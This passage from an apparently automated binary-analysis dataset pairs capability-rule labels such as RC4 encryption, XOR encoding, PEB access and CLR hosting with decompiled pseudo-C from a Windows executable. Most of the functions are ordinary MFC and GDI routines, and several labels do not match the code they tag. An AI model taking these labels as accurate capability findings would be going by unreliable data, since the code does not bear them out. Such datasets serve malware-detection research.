  extraout_ECX[0xf] = 0;\n    extraout_ECX[0xe] = 0;\n    extraout_ECX[5] = 1;\n    extraout_ECX[4] = 1;\n    *in_FS_OFFSET = uVar1;\n    return extraout_ECX;\n}\n",
        "token_count": 471
    },
    "00402030": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00402030(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x14) = param_2;\n    if (0xf < *(param_1 + 0x18)) {\n        *(*(param_1 + 4) + param_2) = 0;\n        return;\n    }\n    *(param_1 + 4 + param_2) = 0;\n    return;\n}\n",
        "token_count": 104
    },
    "00404010": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00404010(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004038a0(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 161
    },
    "00404580": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00404580(int32_t param_1, uint param_2, uint param_3)\n\n{\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4) = 0;\n    fcn.004045b0(param_2, param_3);\n    return param_1;\n}\n",
        "token_count": 98
    },
    "0041d3de": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.0041d3de(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = *(param_1 + 4);\n    if ((iVar1 == 0x200) || (iVar1 == 0xa0)) {\n        iVar1 = fcn.00434fd8();\n        iVar2 = fcn.00409776(*(param_1 + 0x14), *(param_1 + 0x18));\n        if ((iVar2 == 0) || (*(param_1 + 4) != *(iVar1 + 0x54))) {\n            *(iVar1 + 0x4c) = *(param_1 + 0x14);\n            *(iVar1 + 0x50) = *(param_1 + 0x18);\n            *(iVar1 + 0x54) = *(param_1 + 4);\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        return uVar3;\n    }\n    if ((iVar1 != 0xf) && (iVar1 != 0x118)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "00423296": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.00423296(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code *pcVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    pcVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CHandleMap.0;\n    uVar2 = *(pcVar1 + 4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00409e0a(uVar2, 0x40);\n    *(unaff_EBP + -4) = 0;\n    fcn.0041b691(10);\n    *(unaff_EBP + -4) = 1;\n    fcn.0041b691(4);\n    *(unaff_EBP + -4) = 2;\n    fcn.0041b4ae(7, 0);\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[5] = *(unaff_EBP + 0xc);\n    extraout_ECX[6] = *(unaff_EBP + 0x10);\n    extraout_ECX[0x16] = *(unaff_EBP + 0x14);\n    pcVar3 = *(unaff_EBP + 0x18);\n    extraout_ECX[0x15] = pcVar1;\n    extraout_ECX[0x17] = pcVar3;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 457
    },
    "00434eb7": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00434eb7(code **param_1, uchar param_2)\n\n{\n    *param_1 = vtable.AFX_MODULE_STATE.0;\n    param_1[7] = NULL;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    param_1[10] = NULL;\n    param_1[0x40f] = NULL;\n    param_1[0x410] = NULL;\n    param_1[0x413] = 0xffffffff;\n    param_1[0x414] = NULL;\n    param_1[0x419] = NULL;\n    param_1[0x41a] = NULL;\n    param_1[10] = 0x1c;\n    param_1[8] = 0x14;\n    param_1[6] = NULL;\n    *(param_1 + 5) = param_2;\n    param_1[0xc] = 0x1;\n    param_1[0x410] = 0x18;\n    return;\n}\n",
        "token_count": 239
    },
    "00435ae8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00435ae8(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.CCommandLineInfo.0;\n    fcn.00401180();\n    fcn.00401180();\n    fcn.00401180();\n    ppiVar3 = param_1[5] + -0x10;\n    piVar1 = param_1[5] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "00435ee3": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** fcn.00435ee3(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0041bd46();\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CWinThread.0;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    fcn.00435e8a();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 197
    },
    "004196de": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint fcn.004196de(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0xffffffff;\n    piVar2 = fcn.0041d1d1();\n    iVar3 = fcn.00434fe8();\n    piVar1 = *(iVar3 + 4);\n    iVar3 = fcn.0043885b(param_1, param_2, param_3, param_4);\n    if ((iVar3 != 0) && ((piVar1 == NULL || (iVar3 = (**(*piVar1 + 0x90))(),  iVar3 != 0)))) {\n        iVar3 = (**(*piVar2 + 0x50))();\n        if (iVar3 == 0) {\n            if (piVar2[7] != 0) {\n                (**(*piVar2[7] + 0x60))();\n            }\n            uVar4 = (**(*piVar2 + 0x68))();\n        }\n        else {\n            uVar4 = (**(*piVar2 + 0x54))();\n        }\n    }\n    fcn.0043a9f4();\n    return uVar4;\n}\n",
        "token_count": 296
    },
    "00423ddd": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00423ddd(int32_t *param_1, int32_t param_2)\n\n{\n    fcn.0041afb0(param_2);\n    *(param_2 + 0x50) = param_1;\n    (**(*param_1 + 0x68))();\n    return;\n}\n",
        "token_count": 72
    },
    "00423dfd": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00423dfd(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0041af0d(param_2, 0);\n    fcn.0041aecd(uVar1);\n    *(param_2 + 0x50) = 0;\n    (**(*param_1 + 0x68))();\n    return;\n}\n",
        "token_count": 98
    },
    "0042fa6c": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042fa6c(int32_t param_1)\n\n{\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    iStack8 = param_1;\n    iStack4 = param_1;\n    fcn.0042f924();\n    (**(**(param_1 + 0x68) + 0x134))(&iStack8, *(param_1 + 0x40) - *(param_1 + 0x38), 0x42);\n    fcn.00433fa3(*(param_1 + 0x68), *(param_1 + 0x48), *(param_1 + 0x4c), *(param_1 + 0x70) & 0x40 | 0x2004);\n    return;\n}\n",
        "token_count": 179
    },
    "00437bd0": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a",
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00437bd0(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\", 0, 0x2001f, &var_4h);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (var_4h, *(param_1 + 0x50), 0, 0, 0, 0x2001f, 0, &var_8h, &var_10h);\n        if (iVar2 == 0) {\n            (*pcVar1)(var_8h, *(param_1 + 100), 0, 0, 0, 0x2001f, 0, &var_ch, &var_10h);\n        }\n    }\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    if (var_8h != 0) {\n        (*pcVar1)(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 379
    },
    "00406f80": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid fcn.00406f80(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (param_3 != 0) {\n        do {\n            *(uVar1 + param_2) = *(uVar1 + param_2) ^ *(param_1 + (uVar1 % param_4) * 2);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 != param_3);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00409948": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409948(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*arg_8h < 0x76c) {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    else {\n        fcn.004098e8(*arg_8h, arg_8h[1], arg_8h[3], arg_8h[4], arg_8h[5], arg_8h[6], arg_ch);\n        *in_ECX = in_ECX;\n        in_ECX[1] = in_ECX;\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0042672f": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: nWidth\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: nHeight\n\nvoid __cdecl fcn.0042672f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    uint var_52h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint hdc;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x3c) = vtable.CDC.0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x4c) = vtable.CDC.0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x1c) = vtable.CBitmap.0;\n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    *(unaff_EBP + -4) = 2;\n    uVar2 = (*pcVar1)(0x14);\n    fcn.004266e5(uVar2);\n    *(unaff_EBP + -4) = 3;\n    uVar2 = (*pcVar1)(0x10);\n    fcn.004266e5(uVar2);\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    uVar2 = (*pcVar1)(0);\n    iVar3 = fcn.00426288(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = (*pcVar1)(0);\n        iVar3 = fcn.00426288(uVar2);\n        if (iVar3 != 0) {\n            iVar3 = *(unaff_EBP + 8);\n            (*_sym.imp.GDI32.dll_GetObjectA)(*(iVar3 + 4), 0x18, unaff_EBP + -100);\n            fcn.004265c6();\n            uVar2 = *(unaff_EBP + -0x60);\n            iVar4 = fcn.00409c58(uVar2, *(unaff_EBP + -0x5c), *(unaff_EBP + -0x54), *(unaff_EBP + -0x52), 0);\n            if (iVar4 != 0) {\n                uVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(*(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), 1, 1, 0);\n                iVar4 = fcn.0042656f();\n                if (iVar4 != 0) {\n                    uVar2 = fcn.004265f8(*(unaff_EBP + -0x38), *(iVar3 + 4));\n                    *(unaff_EBP + 8) = uVar2;\n                    uVar2 = *(unaff_EBP + -0x48);\n                    iVar3 = fcn.004265f8(uVar2, *(unaff_EBP + -0x18));\n                    *(unaff_EBP + -0x14) = iVar3;\n                    if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                        uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x38), 0, 0);\n                        uVar2 = fcn.00425d12(uVar2);\n                        pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                        *(unaff_EBP + -0x10) = uVar2;\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0xcc0020);\n                        fcn.00425d12(0xffffff);\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0x1100a6);\n                        if (*(unaff_EBP + 0xc) == 0) {\n                            uVar2 = 0;\n                        }\n                        else {\n                            uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                        }\n                        iVar3 = fcn.004265f8(*(unaff_EBP + -0x38), uVar2);\n                        if (iVar3 != 0) {\n                            fcn.0043457b(0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), *(unaff_EBP + 0x10));\n                            fcn.00425d12(0xffffff);\n                            uVar2 = fcn.0042664b(unaff_EBP + -0x2c);\n                            *(unaff_EBP + 0xc) = uVar2;\n                            (*pcVar1)(*(unaff_EBP + -0x38), 1, 1, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.0042664b(unaff_EBP + -0x24);\n                            (*pcVar1)(*(unaff_EBP + -0x38), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.0042664b(*(unaff_EBP + 0xc));\n                            fcn.00425d12(*(unaff_EBP + -0x10));\n                        }\n                        fcn.004265f8(*(unaff_EBP + -0x48), *(*(unaff_EBP + -0x14) + 4));\n                        uVar2 = *(*(unaff_EBP + 8) + 4);\n                        fcn.004265f8(*(unaff_EBP + -0x38), uVar2);\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -0x24) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 3;\n    fcn.004265c6(uVar2);\n    *(unaff_EBP + -0x2c) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.004265c6();\n    *(unaff_EBP + -0x1c) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 1;\n    fcn.004265c6();\n    *(unaff_EBP + -4) = 0;\n    fcn.004262f0();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004262f0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1888
    },
    "004269b3": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_66h\n// WARNING: Variable defined which should be unmapped: lprc\n\nvoid __cdecl fcn.004269b3(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpvObject;\n    uint var_74h;\n    uint var_70h;\n    uint var_66h;\n    uint lprc;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint hdc;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint hDC;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint hbr;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x40) = vtable.CDC.0;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x50) = vtable.CDC.0;\n    *(unaff_EBP + -0x4c) = 0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x30) = vtable.CDC.0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = vtable.CBitmap.0;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x20) = vtable.CBrush.0;\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    uVar2 = (*pcVar1)(0);\n    iVar3 = fcn.00426288(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = (*pcVar1)(0);\n        iVar3 = fcn.00426288(uVar2);\n        if (iVar3 != 0) {\n            uVar2 = (*pcVar1)(0);\n            iVar3 = fcn.00426288(uVar2);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.GDI32.dll_GetObjectA)(*(*(unaff_EBP + 8) + 4), 0x18, unaff_EBP + -0x78);\n                if (iVar3 != 0) {\n                    fcn.004265c6();\n                    iVar3 = fcn.00409c58(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), *(unaff_EBP + -0x68), \n                                         *(unaff_EBP + -0x66), 0);\n                    pcVar1 = _sym.imp.GDI32.dll_CreateBitmap;\n                    if (iVar3 != 0) {\n                        uVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, 0x44204c);\n                        fcn.0042656f(uVar2);\n                        fcn.00409c37(unaff_EBP + -0x18);\n                        fcn.004265c6();\n                        uVar2 = (*pcVar1)(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), 1, 1, 0);\n                        fcn.0042656f(uVar2);\n                        uVar2 = fcn.004265f8(*(unaff_EBP + -0x3c), *(*(unaff_EBP + 8) + 4));\n                        *(unaff_EBP + 8) = uVar2;\n                        iVar3 = fcn.004265f8(*(unaff_EBP + -0x4c), *(unaff_EBP + -0x14));\n                        *(unaff_EBP + -0x10) = iVar3;\n                        if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                            uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x3c), 0, 0);\n                            uVar2 = fcn.00425d12(uVar2);\n                            pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                            (*_sym.imp.GDI32.dll_BitBlt)\n                                      (*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                       *(unaff_EBP + -0x3c), 0, 0, 0xcc0020);\n                            fcn.00425d12(0xffffff);\n                            (*pcVar1)(*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                      *(unaff_EBP + -0x3c), 0, 0, 0xee0086);\n                            fcn.00425d12(uVar2);\n                            if (*(unaff_EBP + 0xc) == 0) {\n                                uVar2 = 0;\n                            }\n                            else {\n                                uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                            }\n                            iVar3 = fcn.004265f8(*(unaff_EBP + -0x2c), uVar2);\n                            *(unaff_EBP + 0xc) = iVar3;\n                            if (iVar3 == 0) {\n                                uVar2 = 0;\n                            }\n                            else {\n                                uVar2 = fcn.00425d6f(*(unaff_EBP + 0x10));\n                                uVar4 = fcn.00425d12(*(unaff_EBP + 0x14));\n                                *(unaff_EBP + 0x14) = uVar4;\n                                *(unaff_EBP + -0x58) = *(unaff_EBP + -0x74);\n                                *(unaff_EBP + -0x54) = *(unaff_EBP + -0x70);\n                                *(unaff_EBP + -0x60) = 0;\n                                *(unaff_EBP + -0x5c) = 0;\n                                (*_sym.imp.USER32.dll_FillRect)\n                                          (*(unaff_EBP + -0x2c), unaff_EBP + -0x60, *(unaff_EBP + -0x1c));\n                                fcn.00425d6f(uVar2);\n                                fcn.00425d12(*(unaff_EBP + 0x14));\n                                (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                          *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                                (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                          *(unaff_EBP + -0x4c), 0, 0, 0x8800c6);\n                                (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                          *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                                uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                            }\n                            fcn.004265f8(*(unaff_EBP + -0x2c), uVar2);\n                            fcn.004265f8(*(unaff_EBP + -0x4c), *(*(unaff_EBP + -0x10) + 4));\n                            fcn.004265f8(*(unaff_EBP + -0x3c), *(*(unaff_EBP + 8) + 4));\n                        }\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -0x20) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 3;\n    fcn.004265c6();\n    *(unaff_EBP + -0x18) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.004265c6();\n    *(unaff_EBP + -4) = 1;\n    fcn.004262f0();\n    *(unaff_EBP + -4) = 0;\n    fcn.004262f0();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004262f0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 2302
    },
    "004273dc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004273dc(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    \n    if (*(*(param_1 + 0x60) + -0xc) == 0) {\n        fcn.004033b0(*(param_1 + 0x3c));\n    }\n    pcVar2 = _sym.imp.USER32.dll_LoadAcceleratorsA;\n    pcVar1 = _sym.imp.USER32.dll_LoadMenuA;\n    if ((*(param_1 + 0x44) != 0) && (*(param_1 + 0x2c) == 0)) {\n        iVar3 = fcn.00434fe8();\n        uVar5 = *(iVar3 + 0xc);\n        uVar4 = (*pcVar1)(uVar5, *(param_1 + 0x44));\n        *(param_1 + 0x2c) = uVar4;\n        uVar5 = (*pcVar2)(uVar5, *(param_1 + 0x44));\n        *(param_1 + 0x30) = uVar5;\n    }\n    if ((*(param_1 + 0x40) != 0) && (*(param_1 + 0x34) == 0)) {\n        iVar3 = fcn.00434fe8();\n        uVar5 = *(iVar3 + 0xc);\n        uVar4 = (*pcVar1)(uVar5, *(param_1 + 0x40));\n        *(param_1 + 0x34) = uVar4;\n        uVar5 = (*pcVar2)(uVar5, *(param_1 + 0x40));\n        *(param_1 + 0x38) = uVar5;\n    }\n    if ((*(param_1 + 0x48) != 0) && (*(param_1 + 0x24) == 0)) {\n        iVar3 = fcn.00434fe8();\n        uVar5 = *(iVar3 + 0xc);\n        uVar4 = (*pcVar1)(uVar5, *(param_1 + 0x48));\n        *(param_1 + 0x24) = uVar4;\n        uVar5 = (*pcVar2)(uVar5, *(param_1 + 0x48));\n        *(param_1 + 0x28) = uVar5;\n    }\n    return;\n}\n",
        "token_count": 553
    },
    "0042167d": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0042167d(uint hKey, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint lpType;\n    uint lpData;\n    uint lpcbData;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar4 = false;\n    var_8h = 0;\n    lpData = fcn.004026d0(0x104);\n    pcVar2 = _sym.imp.ADVAPI32.dll_RegOpenKeyA;\n    lpcbData = 0x104;\n    lpType = 0;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, \"CLSID\", &var_8h);\n    if (iVar3 == 0) {\n        var_4h = 0;\n        iVar3 = (*pcVar2)(var_8h, hKey, &var_4h);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar3 == 0) {\n            hKey = 0;\n            iVar3 = (*pcVar2)(var_4h, \"InProcServer32\", &hKey);\n            if (iVar3 == 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, 0x43d878, 0, &lpType, lpData, &lpcbData);\n                bVar4 = iVar3 == 0;\n                (*pcVar1)(hKey);\n            }\n            (*pcVar1)(var_4h);\n        }\n        (*pcVar1)(var_8h);\n    }\n    fcn.00407fe0(0xffffffff);\n    return bVar4;\n}\n",
        "token_count": 400
    },
    "00435c03": {
        "rules": [
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: phkResult\n// WARNING: Variable defined which should be unmapped: var_120h\n// WARNING: Variable defined which should be unmapped: var_11ch\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00435c03(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, uint noname_73, \n            uint noname_74, uint lpSubKey)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint hKey;\n    uint var_ch_2;\n    uint var_14h;\n    uint 